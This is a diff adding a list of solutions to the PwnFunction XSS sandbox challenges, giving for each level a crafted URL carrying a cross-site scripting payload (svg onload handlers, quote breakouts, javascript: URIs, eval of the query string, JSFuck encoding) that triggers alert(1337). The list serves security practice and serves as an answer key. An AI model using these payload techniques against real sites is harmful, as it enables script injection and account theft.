@@ -1,0 +1,28 @@
+Ma Spaghet!
+https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=%3C/h2%3E%3Csvg/onload=alert(1337)%3E%3C/h2%3E
+
+Jefff
+https://sandbox.pwnfunction.com/warmups/jefff.html?jeff=%22;alert(1337);//
+
+Ugandan Knuckles
+https://sandbox.pwnfunction.com/warmups/da-wey.html?wey=%22/autofocus/onfocus=%22alert(1337)
+
+Ricardo Milos
+https://sandbox.pwnfunction.com/warmups/ricardo.html?ricardo=javascript:alert(1337)
+
+Ah That's Hawt
+https://sandbox.pwnfunction.com/warmups/thats-hawt.html?markassbrownlee=%3Csvg/onload=alert%26%23x60%3B1%26%23x60%3B%3E
+
+Ligma
+Encode "alert(1337)" using JSFuck.
+URL Encode the result and use that as the value of the GET parametre balls.
+
+Mafia
+https://sandbox.pwnfunction.com/warmups/mafia.html?mafia=eval(location.search.slice(51,62))&solution=alert(1337)
+
+Ok, Boomer
+https://sandbox.pwnfunction.com/warmups/ok-boomer.html?boomer=%3Ca%20id=ok%20href=tel:alert`1`%3E
+
+Area 51
+https://sandbox.pwnfunction.com/challenges/area-51.html?debug=%3C?php%3E%3Csvg%20onload=alert`1337`%3E
+
